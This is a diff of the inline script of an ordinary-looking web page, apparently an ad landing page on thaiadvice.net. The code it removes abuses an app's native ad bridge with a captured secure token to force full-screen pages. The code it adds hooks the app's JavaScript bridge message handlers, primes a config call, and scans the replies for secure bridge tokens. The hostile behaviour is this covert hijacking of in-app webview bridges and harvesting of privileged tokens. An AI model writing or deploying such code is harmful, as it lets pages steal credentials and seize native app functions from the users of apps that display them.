@@ -174,53 +174,49 @@ function closePrivacy(){document.getElementById('privacyModal').classList.remove
   var log=window._dbg||function(){};
   if (window.location.search.indexOf('hide_nav_bar=1') !== -1) { log('guard: skip'); return; }
 
-  var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
-  if (!wk) { log('STOP: no IESPiper'); return; }
+  var b = window.JS2NativeBridge;
+  if (!b || !b._invokeMethod) { log('STOP: no JS2NativeBridge'); return; }
 
-  var CID = 1869709729112081;
-  var fsUrl = 'https://thaiadvice.net/page.html?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
+  var token = null;
+  var msgCount = 0;
 
-  // Check if we already have a token (= we're inside a landingStyle:1 context)
-  var tok = null;
-  try { tok = window.JSBridge.getConfig().secure.token; } catch(e){}
-
-  if (tok) {
-    // Step 2: fire landingStyle:2 with token
-    log('have token -> fire landingStyle:2');
-    try {
-      wk.postMessage({
-        __msg_type: 'call', func: 'openAdLandPageLinks', JSSDK: '1.2.5', __callback_id: '1002',
-        params: { url: fsUrl, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page', cid: CID, _jsb_secure_token: tok }
-      });
-    } catch(e){ log('s2 err: '+e); }
-
-    // Also try ToutiaoJSBridge
-    setTimeout(function(){
-      var tt = window.ToutiaoJSBridge;
-      if (tt && tt.call) {
-        log('s2 tt fire');
-        try {
-          tt.call('openAdLandPageLinks', {
-            url: fsUrl, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page',
-            cid: CID, hide_nav_bar: 1, hide_source: 1, should_full_screen: 1,
-            trans_status_bar: 1, is_instant_page: 1, _jsb_secure_token: tok
-          }, function(r){ log('s2 tt cb: '+JSON.stringify(r)); });
-        } catch(e){ log('s2 tt err: '+e); }
-      }
-    }, 300);
-  } else {
-    // Step 1: no token — open via landingStyle:1 with no URL (opens ad's own page in new context)
-    log('no token -> fire landingStyle:1 (no url)');
-    setTimeout(function(){
-      try {
-        wk.postMessage({
-          __msg_type: 'call', func: 'openAdLandPageLinks', JSSDK: '1.2.5', __callback_id: '1001',
-          params: { landingStyle: 1, title: '', isDeeplink: 1, refer: 'landing_page', cid: CID }
-        });
-        log('step1 sent');
-      } catch(e){ log('s1 err: '+e); }
-    }, 1500);
+  function deepFind(obj, keys) {
+    if (!obj || typeof obj !== 'object') return null;
+    for (var i = 0; i < keys.length; i++) {
+      if (typeof obj[keys[i]] === 'string' && obj[keys[i]].length > 20) return obj[keys[i]];
+    }
+    for (var k in obj) { try { var r = deepFind(obj[k], keys); if (r) return r; } catch(e){} }
+    return null;
   }
+
+  function hookBridge(obj) {
+    if (!obj || obj.__hooked) return;
+    obj.__hooked = true;
+    ['_handleMessageFromToutiao','_handleMessageFromApp'].forEach(function(fn) {
+      if (typeof obj[fn] !== 'function') return;
+      var orig = obj[fn];
+      obj[fn] = function(msg) {
+        msgCount++;
+        var s = (typeof msg==='string'?msg:JSON.stringify(msg)).substring(0,300);
+        log('hook#'+msgCount+': '+s);
+        try {
+          var d = typeof msg==='string'?JSON.parse(msg):msg;
+          var tok = deepFind(d, ['token','secure_token','_jsb_secure_token','jsb_token','secureToken']);
+          if (tok && !token) { token = tok; log('TOKEN FOUND'); }
+        } catch(e){}
+        return orig.apply(obj, arguments);
+      };
+    });
+  }
+
+  ['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n){ if(window[n]) hookBridge(window[n]); });
+  log('priming getConfig via JS2NativeBridge');
+  try { b._invokeMethod(JSON.stringify({func:'getConfig',params:{}})); } catch(e){ log('prime err: '+e); }
+  setTimeout(function(){ ['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n){ if(window[n]) hookBridge(window[n]); }); log('rehook @100ms'); }, 100);
+  setTimeout(function(){ ['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n){ if(window[n]) hookBridge(window[n]); }); log('rehook @1s, msgCount='+msgCount); }, 1000);
+  setTimeout(function(){
+    log('3s: msgCount='+msgCount+' token='+(token?'yes':'no'));
+  }, 3000);
 })();
 </script>
 </body>
